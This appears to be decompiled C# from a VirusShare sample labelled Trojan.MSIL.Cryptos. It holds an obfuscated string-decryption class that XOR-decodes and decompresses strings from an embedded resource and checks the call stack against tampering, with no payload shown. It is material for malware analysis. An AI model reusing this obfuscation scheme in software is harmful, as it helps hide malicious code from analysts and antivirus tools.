// Decompiled with JetBrains decompiler
// Type:  
// Assembly: 18, Version=1.1.1.1, Culture=neutral, PublicKeyToken=null
// MVID: F162A374-52C4-452F-A306-4A975A4C8F99
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Cryptos.ee-550bf06d067322f34b732ab38be4a0f105ab3663052db1193cabd8e753cd434c.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

internal static class \u0002\u2000
{
  private static \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000 \u0002;
  private static \u0002\u2000.\u0008\u2001\u2006\u2006\u2007\u2005\u2002​\u2005\u2001\u2008\u2004\u2002\u2004\u2001\u2000\u2004​\u2008\u2008\u200A\u200A\u2008\u2003\u2001\u2009\u2009\u2009 \u0003;
  private static byte[] \u0005;
  private static short \u0008;
  private static int \u0006;
  private static byte[] \u000E;
  private static int \u000F;
  private static int \u0002\u2000;
  private static \u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001 \u0003\u2000;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0002\u2000()
  {
    if (true)
      goto label_6;
label_1:
    int num1;
    int num2 = -1487715563 ^ num1;
    if (true)
      goto label_7;
label_2:
    \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000 obj = new \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000(23);
    if (true)
      goto label_8;
label_3:
    if (true)
      goto label_9;
label_4:
    int skipFrames;
    StackTrace stackTrace1 = new StackTrace(skipFrames, false);
    if (true)
      goto label_10;
label_5:
    int index = skipFrames - 1;
    StackTrace stackTrace2;
    StackFrame frame = stackTrace2.GetFrame(index);
    int num3;
    int num4 = ~--~-~~-~-~(num1 + 1955640606 ^ num3) ^ ~-~--~~-~(-1516618062 - num1 - num3);
    MethodBase methodBase = frame == null ? (MethodBase) null : frame.GetMethod();
    if (frame != null)
      num4 ^= -~~--~~-~-~(888234853 + num1 + num3);
    Type type = (object) methodBase == null ? (Type) null : methodBase.DeclaringType;
    int num5;
    if ((object) type == (object) typeof (RuntimeMethodHandle))
    {
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001) 4 | \u0002\u2000.\u0003\u2000;
      num5 = num4 ^ (-1487716302 ^ num1 ^ num3) + index;
    }
    else if ((object) type == null)
    {
      num5 = num4 ^ -~-~~--~-~~(num1 + 1699525185 - num3);
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001) 1 | \u0002\u2000.\u0003\u2000;
    }
    else if ((object) type.Assembly != (object) typeof (\u0002\u2000).Assembly)
    {
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001) 2 | \u0002\u2000.\u0003\u2000;
      num5 = num4 ^ -813807104 - num1 ^ num3;
    }
    else
    {
      num5 = num4 ^ -~-~-~-~~-~(num1 + 1699538195 - num3) - index;
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001) 16 | \u0002\u2000.\u0003\u2000;
    }
    \u0002\u2000.\u0002\u2000 += num5;
    return;
label_10:
    stackTrace2 = stackTrace1;
    goto label_5;
label_9:
    skipFrames = 1;
    goto label_4;
label_8:
    \u0002\u2000.\u0002 = obj;
    goto label_3;
label_7:
    num3 = num2;
    goto label_2;
label_6:
    num1 = 696495314;
    goto label_1;
  }

  private static void \u0002(byte[] _param0, int _param1, byte[] _param2)
  {
    if (true)
      goto label_4;
label_1:
    if (true)
      goto label_5;
label_2:
    if (true)
      goto label_6;
label_3:
    int length = _param2.Length;
label_16:
    int num1;
    int num2;
    int num3;
    while (num1 < length)
    {
      if ((num3 <<= 1) == 256)
      {
        num3 = 1;
        num2 = (int) _param0[_param1++];
      }
      if ((num2 & num3) != 0)
      {
        int num4 = ((int) _param0[_param1] >> 2) + 3;
        int num5 = ((int) _param0[_param1] << 8 | (int) _param0[_param1 + 1]) & 1023;
        _param1 += 2;
        int num6 = num1 - num5;
        if (num6 < 0)
          break;
        while (true)
        {
          if (--num4 >= 0 && num1 < length)
            _param2[num1++] = _param2[num6++];
          else
            goto label_16;
        }
      }
      else
        _param2[num1++] = _param0[_param1++];
    }
    return;
label_6:
    num3 = 128;
    goto label_3;
label_5:
    num2 = 0;
    goto label_2;
label_4:
    num1 = 0;
    goto label_1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static string \u0002(int _param0)
  {
    if (true)
      goto label_4;
label_1:
    int num1;
    int num2 = -2075839913 - num1;
    if (true)
      goto label_5;
label_2:
    \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000 obj1 = \u0002\u2000.\u0002;
    if (true)
      goto label_6;
label_3:
    Monitor.Enter((object) obj1);
    int num3;
    \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000 obj2;
    string str1;
    try
    {
      string str2;
      byte[] numArray1;
      int num4;
      while (true)
      {
        string str3 = \u0002\u2000.\u0002.\u0002(_param0);
        if (true)
          goto label_9;
label_8:
        if (str2 == null)
        {
          int num5;
          if (\u0002\u2000.\u0003 == null)
          {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            if (true)
              goto label_19;
label_14:
            Assembly.GetCallingAssembly();
            if (true)
              goto label_20;
label_15:
            int num6 = \u0002\u2000.\u0006 | (2063678245 ^ num1) - num3;
            if (true)
              goto label_21;
label_16:
            Assembly assembly1;
            Assembly assembly2 = assembly1;
            StringBuilder stringBuilder1 = new StringBuilder();
            if (true)
              goto label_22;
label_17:
            int num7 = num1 - 1681592910 + num3;
            if (true)
              goto label_23;
label_18:
            StringBuilder stringBuilder2;
            int num8;
            stringBuilder2.Append((char) (num8 >> 16)).Append((char) num8);
            int num9 = 1681936984 - num1 ^ num3;
            stringBuilder2.Append((char) (num9 >> 16)).Append((char) num9);
            int num10 = 2028828326 + num1 - num3;
            stringBuilder2.Append((char) (num10 >> 16)).Append((char) num10);
            int num11 = 1529907619 ^ num1 ^ num3;
            stringBuilder2.Append((char) num11).Append((char) (num11 >> 16));
            int num12 = num1 - 1681592916 + num3;
            stringBuilder2.Append((char) num12).Append((char) (num12 >> 16));
            int num13 = -1538764196 - num1 - num3;
            stringBuilder2.Append((char) num13).Append((char) (num13 >> 16));
            num8 = (num1 ^ -1530644907) + num3;
            stringBuilder2.Append((char) num8).Append((char) (num8 >> 16));
            string name = stringBuilder2.ToString();
            Stream manifestResourceStream = assembly2.GetManifestResourceStream(name);
            int skipFrames = 1;
            StackTrace stackTrace = new StackTrace(skipFrames, false);
            \u0002\u2000.\u0006 ^= -2075833571 - num1 ^ num3 | skipFrames;
            int index = skipFrames - 1;
            StackFrame frame = stackTrace.GetFrame(index);
            MethodBase methodBase = frame == null ? (MethodBase) null : frame.GetMethod();
            \u0002\u2000.\u0006 ^= index + ((num1 ^ 2067441959) - num3);
            Type type = (object) methodBase == null ? (Type) null : methodBase.DeclaringType;
            if (frame == null)
              \u0002\u2000.\u0006 ^= 1491545836 + num1 ^ num3;
            bool flag = (object) type == (object) typeof (RuntimeMethodHandle);
            \u0002\u2000.\u0006 ^= (2067441863 ^ num1) - num3;
            if (!flag)
            {
              flag = (object) type == null;
              if (flag)
                \u0002\u2000.\u0006 ^= num1 + 2076059196 + num3;
            }
            if (flag == (stackTrace != null))
              \u0002\u2000.\u0006 ^= 32;
            \u0002\u2000.\u0006 ^= -2075833603 - num1 ^ num3 | index + 1;
            \u0002\u2000.\u0003 = new \u0002\u2000.\u0008\u2001\u2006\u2006\u2007\u2005\u2002​\u2005\u2001\u2008\u2004\u2002\u2004\u2001\u2000\u2004​\u2008\u2008\u200A\u200A\u2008\u2003\u2001\u2009\u2009\u2009(manifestResourceStream);
            short num14 = (short) ((int) \u0002\u2000.\u0003.\u0002() ^ (int) (short) -~~-~-~-~((num1 ^ -2067461732) + num3));
            if (num14 == (short) 0)
              \u0002\u2000.\u0008 = (short) ((int) \u0002\u2000.\u0003.\u0002() ^ (int) (short) ~--~~-~-~-~(-2075840162 - num1 ^ num3));
            else
              \u0002\u2000.\u0005 = \u0002\u2000.\u0003.\u0002((int) num14);
            Assembly assembly3 = assembly1;
            AssemblyName assemblyName;
            try
            {
              assemblyName = assembly3.GetName();
            }
            catch
            {
              assemblyName = new AssemblyName(assembly3.FullName);
            }
            \u0002\u2000.\u000E = assemblyName.GetPublicKeyToken();
            if (\u0002\u2000.\u000E != null && \u0002\u2000.\u000E.Length == 0)
              \u0002\u2000.\u000E = (byte[]) null;
            int num15 = \u0002\u2000.\u0002\u2000;
            \u0002\u2000.\u0002\u2000 = 0;
            long num16 = \u0005\u2000.\u0002();
            num5 = num15 ^ (int) (uint) num16 ^ num1 - 1980655494 - num3 ^ ~-~--~~-~(10334586 ^ num1 ^ num3);
            \u0002\u2000.\u0006 = \u0002\u2000.\u0006 & -1223055145 - num1 + num3 ^ 2067444515 ^ num1 ^ num3;
            \u0002\u2000.\u000F = num5;
            if ((\u0002\u2000.\u0003\u2000 & (\u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001) -~~-~-~-~-~(num1 + 2075839893 + num3)) == (\u0002\u2000.\u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001) 0)
            {
              \u0002\u2000.\u0006 = 2067399197 ^ num1 ^ num3;
              goto label_41;
            }
            else
              goto label_41;
label_23:
            num8 = num7;
            goto label_18;
label_22:
            stringBuilder2 = stringBuilder1;
            goto label_17;
label_21:
            \u0002\u2000.\u0006 = num6;
            goto label_16;
label_20:
            goto label_15;
label_19:
            assembly1 = executingAssembly;
            goto label_14;
          }
          else
            num5 = \u0002\u2000.\u000F;
label_41:
          if (\u0002\u2000.\u0006 != 2075883875 + num1 + num3)
          {
            int num17 = _param0 ^ 1422943207 - num1 - num3 ^ num5 ^ 190141450 ^ num1 ^ num3;
            \u0002\u2000.\u0003.\u0002().Position = (long) num17;
            if (\u0002\u2000.\u0005 != null)
            {
              numArray1 = \u0002\u2000.\u0005;
            }
            else
            {
              short num18 = \u0002\u2000.\u0008 != (short) -1 ? \u0002\u2000.\u0008 : (short) ((int) \u0002\u2000.\u0003.\u0002() ^ -1491484717 - num1 + num3 ^ num17);
              if (num18 == (short) 0)
              {
                numArray1 = (byte[]) null;
              }
              else
              {
                numArray1 = \u0002\u2000.\u0003.\u0002((int) num18);
                for (int index = 0; index != numArray1.Length; ++index)
                  numArray1[index] ^= (byte) (\u0002\u2000.\u000F >> ((3 & index) << 3));
              }
            }
            num4 = \u0002\u2000.\u0003.\u0002() ^ num17 ^ -~~-~-~-~-~((num1 ^ 512931982) - num3) ^ num5;
            if (num4 == (num1 + 2075839913 ^ num3))
            {
              byte[] numArray2 = \u0002\u2000.\u0003.\u0002(4);
              _param0 = (-512931982 ^ num1) + num3 ^ num5;
              _param0 = ((int) numArray2[2] | (int) numArray2[3] << 16 | (int) numArray2[0] << 8 | (int) numArray2[1] << 24) ^ -_param0;
              continue;
            }
            goto label_52;
          }
          else
            goto label_42;
        }
        else
          break;
label_9:
        str2 = str3;
        goto label_8;
      }
      string str4 = str2;
      if (true)
      {
        str1 = str4;
        goto label_72;
      }
      else
        goto label_72;
label_42:
      str1 = new string(new char[3]
      {
        (char) (-2075839825 - num1 - num3),
        '0',
        (char) (2067442175 ^ num1 ^ num3)
      });
      goto label_72;
label_52:
      bool flag1 = (num4 & num1 + 2028361371 - num3) != 0;
      bool flag2 = (num4 & num1 - 1729735013 - num3) != 0;
      bool flag3 = (num4 & (num1 ^ 80041561) + num3) != 0;
      int num19 = num4 & (-1262135720 ^ num1) + num3;
      byte[] numArray3 = \u0003\u2000.\u0002(numArray1, \u0002\u2000.\u0003.\u0002(num19));
      if (\u0002\u2000.\u000E != null != (\u0002\u2000.\u0006 != 1493098273 + num1 - num3))
      {
        for (int index = 0; index < num19; index = 1 + index)
        {
          byte num20 = \u0002\u2000.\u000E[index & 7];
          byte num21 = (byte) ((int) num20 << 3 | (int) num20 >> 5);
          numArray3[index] = (byte) ((uint) numArray3[index] ^ (uint) num21);
        }
      }
      int num22 = \u0002\u2000.\u0006 - 12;
      int length;
      byte[] bytes;
      if (!flag3)
      {
        length = num19;
        bytes = numArray3;
      }
      else
      {
        length = (int) numArray3[2] | (int) numArray3[0] << 16 | (int) numArray3[3] << 8 | (int) numArray3[1] << 24;
        bytes = new byte[length];
        \u0002\u2000.\u0002(numArray3, 4, bytes);
      }
      string str5;
      if (flag1 && num22 == (num1 ^ -2077382177) + num3)
      {
        char[] chArray = new char[length];
        for (int index = 0; index < length; ++index)
          chArray[index] = (char) bytes[index];
        str5 = new string(chArray);
      }
      else
        str5 = Encoding.Unicode.GetString(bytes, 0, bytes.Length);
      int num23 = num22 + ((-2075840028 - num1 ^ num3) + (3 & num22) << 5);
      if (num23 != (num1 ^ -2077378049) + num3)
      {
        int num24 = num19 + _param0 ^ -2075460641 - num1 ^ num3 ^ num23 & (num1 ^ 2067440728) - num3;
        ref int local = ref num24;
        StringBuilder stringBuilder = new StringBuilder();
        int num25 = num1 + 2075840001 + num3;
        stringBuilder.Append((char) (byte) num25);
        string format = stringBuilder.ToString();
        str5 = local.ToString(format);
      }
      if (!flag2)
      {
        str5 = string.Intern(str5);
        \u0002\u2000.\u0002.\u0002(_param0, str5);
        if (\u0002\u2000.\u0002.\u0002() == 23)
        {
          \u0002\u2000.\u0003.\u0003();
          \u0002\u2000.\u0003 = (\u0002\u2000.\u0008\u2001\u2006\u2006\u2007\u2005\u2002​\u2005\u2001\u2008\u2004\u2002\u2004\u2001\u2000\u2004​\u2008\u2008\u200A\u200A\u2008\u2003\u2001\u2009\u2009\u2009) null;
          \u0002\u2000.\u0005 = \u0002\u2000.\u000E = (byte[]) null;
        }
      }
      str1 = str5;
    }
    finally
    {
      Monitor.Exit((object) obj2);
    }
label_72:
    return str1;
label_6:
    obj2 = obj1;
    goto label_3;
label_5:
    num3 = num2;
    goto label_2;
label_4:
    num1 = 363818462;
    goto label_1;
  }

  private sealed class \u0008\u2001\u2006\u2006\u2007\u2005\u2002​\u2005\u2001\u2008\u2004\u2002\u2004\u2001\u2000\u2004​\u2008\u2008\u200A\u200A\u2008\u2003\u2001\u2009\u2009\u2009
  {
    private Stream \u0002;
    private byte[] \u0003;

    public \u0008\u2001\u2006\u2006\u2007\u2005\u2002​\u2005\u2001\u2008\u2004\u2002\u2004\u2001\u2000\u2004​\u2008\u2008\u200A\u200A\u2008\u2003\u2001\u2009\u2009\u2009(
      Stream _param1)
    {
      Stream stream = _param1;
      if (true)
        goto label_3;
label_1:
      byte[] numArray = new byte[4];
      if (false)
        return;
      this.\u0003 = numArray;
      return;
label_3:
      this.\u0002 = stream;
      goto label_1;
    }

    public Stream \u0002()
    {
      if (true)
        ;
      return this.\u0002;
    }

    public short \u0002()
    {
      if (true)
        ;
      this.\u0002(2);
      if (true)
        ;
      int num1 = (int) this.\u0003[0];
      if (true)
        ;
      int num2 = (int) this.\u0003[1] << 8;
      return (short) (num1 | num2);
    }

    public int \u0002()
    {
      if (true)
        ;
      this.\u0002(4);
      if (true)
        ;
      int num1 = (int) this.\u0003[0];
      if (true)
        ;
      int num2 = (int) this.\u0003[1] << 8;
      return num1 | num2 | (int) this.\u0003[2] << 16 | (int) this.\u0003[3] << 24;
    }

    private void \u0002() => throw new EndOfStreamException();

    private void \u0002(int _param1)
    {
      if (true)
        goto label_3;
label_1:
      if (true)
        goto label_4;
label_2:
      int offset;
      int num1;
      if (_param1 == 1)
      {
        int num2 = this.\u0002.ReadByte();
        if (true)
          goto label_8;
label_6:
        if (num1 == -1)
          this.\u0002();
        this.\u0003[0] = (byte) num1;
        return;
label_8:
        num1 = num2;
        goto label_6;
      }
      else
      {
        do
        {
          int num3 = this.\u0002.Read(this.\u0003, offset, _param1 - offset);
          if (num3 == 0)
            this.\u0002();
          offset += num3;
        }
        while (offset < _param1);
        return;
      }
label_4:
      num1 = 0;
      goto label_2;
label_3:
      offset = 0;
      goto label_1;
    }

    public void \u0003()
    {
      Stream stream1 = this.\u0002;
      if (true)
        goto label_3;
label_1:
      if (true)
        goto label_4;
label_2:
      Stream stream2;
      stream2?.Close();
      if (false)
        return;
      this.\u0003 = (byte[]) null;
      return;
label_4:
      this.\u0002 = (Stream) null;
      goto label_2;
label_3:
      stream2 = stream1;
      goto label_1;
    }

    public byte[] \u0002(int _param1)
    {
      byte[] numArray1 = _param1 >= 0 ? new byte[_param1] : throw new ArgumentOutOfRangeException();
      if (true)
        goto label_4;
label_3:
      int length;
      if (true)
        length = 0;
      byte[] numArray2;
      do
      {
        int num1 = this.\u0002.Read(numArray2, length, _param1);
        if (true)
          goto label_8;
label_7:
        int num2;
        if (num2 != 0)
        {
          length += num2;
          _param1 -= num2;
          continue;
        }
        break;
label_8:
        num2 = num1;
        goto label_7;
      }
      while (_param1 > 0);
      if (length != numArray2.Length)
      {
        byte[] dst = new byte[length];
        Buffer.BlockCopy((Array) numArray2, 0, (Array) dst, 0, length);
        numArray2 = dst;
      }
      return numArray2;
label_4:
      numArray2 = numArray1;
      goto label_3;
    }
  }

  [DefaultMember("Item")]
  internal sealed class \u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000
  {
    private \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] \u0002;
    private int \u0003;

    public \u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000()
    {
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray = new \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[16];
      if (false)
        return;
      this.\u0002 = objArray;
    }

    public \u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000(
      int _param1)
    {
      if (true)
        goto label_2;
label_1:
      int num1 = _param1 << 1;
      if (true)
        _param1 = num1;
      int length;
      while (length < _param1 && length > 0)
      {
        int num2 = length << 1;
        if (true)
          length = num2;
      }
      if (length < 0)
        length = 16;
      this.\u0002 = new \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[length];
      return;
label_2:
      length = 16;
      goto label_1;
    }

    public int \u0002()
    {
      if (true)
        ;
      return this.\u0003;
    }

    private void \u0002()
    {
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray1 = this.\u0002;
      if (true)
        goto label_5;
label_1:
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray2;
      int length1 = objArray2.Length;
      if (true)
        goto label_6;
label_2:
      int num1;
      int num2 = num1 * 2;
      if (true)
        goto label_7;
label_3:
      int length2;
      if (length2 <= 0)
        return;
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray3 = new \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[length2];
      int num3 = 0;
      for (int index1 = 0; index1 < num1; ++index1)
      {
        string str = objArray2[index1].\u0003;
        if (str != null)
        {
          int num4 = objArray2[index1].\u0002;
          int index2 = num4 & length2 - 1;
          while (objArray3[index2].\u0003 != null)
          {
            ++index2;
            if (index2 >= length2)
              index2 = 0;
          }
          objArray3[index2].\u0003 = str;
          objArray3[index2].\u0002 = num4;
          ++num3;
        }
      }
      this.\u0002 = objArray3;
      this.\u0003 = num3;
      return;
label_7:
      length2 = num2;
      goto label_3;
label_6:
      num1 = length1;
      goto label_2;
label_5:
      objArray2 = objArray1;
      goto label_1;
    }

    public string \u0002(int _param1)
    {
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray1 = this.\u0002;
      if (true)
        goto label_4;
label_1:
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray2;
      int length = objArray2.Length;
      if (true)
        goto label_5;
label_2:
      int num1;
      int num2 = _param1 & num1 - 1;
      if (true)
        goto label_6;
label_3:
      string str = (string) null;
      int index;
      while (objArray2[index].\u0002 != _param1)
      {
        if (objArray2[index].\u0003 != null)
        {
          ++index;
          if (index >= num1)
            index = 0;
        }
        else
          goto label_12;
      }
      str = objArray2[index].\u0003;
label_12:
      return str;
label_6:
      index = num2;
      goto label_3;
label_5:
      num1 = length;
      goto label_2;
label_4:
      objArray2 = objArray1;
      goto label_1;
    }

    public void \u0002(int _param1, string _param2)
    {
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray1 = this.\u0002;
      if (true)
        goto label_4;
label_1:
      \u0002\u2000.\u0003\u2004\u2000\u2002\u2009\u2005\u2001\u2004\u2005\u2000\u2007\u2001\u2008\u2005\u2009\u200A\u2008​\u2006\u2000.\u0002[] objArray2;
      int length = objArray2.Length;
      if (true)
        goto label_5;
label_2:
      int num1;
      int num2 = num1 >> 1;
      if (true)
        goto label_6;
label_3:
      int index = _param1 & num1 - 1;
      int num3;
      while (true)
      {
        do
        {
          int num4 = objArray2[index].\u0002;
          bool flag = objArray2[index].\u0003 == null;
          if (num4 == _param1 || flag)
          {
            objArray2[index].\u0003 = _param2;
            if (!flag)
              return;
            objArray2[index].\u0002 = _param1;
            ++this.\u0003;
            if (this.\u0003 <= num3)
              return;
            this.\u0002();
            return;
          }
          ++index;
        }
        while (index < num1);
        index = 0;
      }
label_6:
      num3 = num2;
      goto label_3;
label_5:
      num1 = length;
      goto label_2;
label_4:
      objArray2 = objArray1;
      goto label_1;
    }

    private struct \u0002
    {
      public int \u0002;
      public string \u0003;
    }
  }

  private enum \u0003\u2004\u2006\u200A\u2008\u2006\u2008\u2009\u2006\u2008\u2000\u2008\u2003​\u2009\u2002\u200A\u2003\u2005\u2006\u2006\u200A\u2009\u200A\u2009\u2008\u2000\u2002\u2001
  {
  }
}
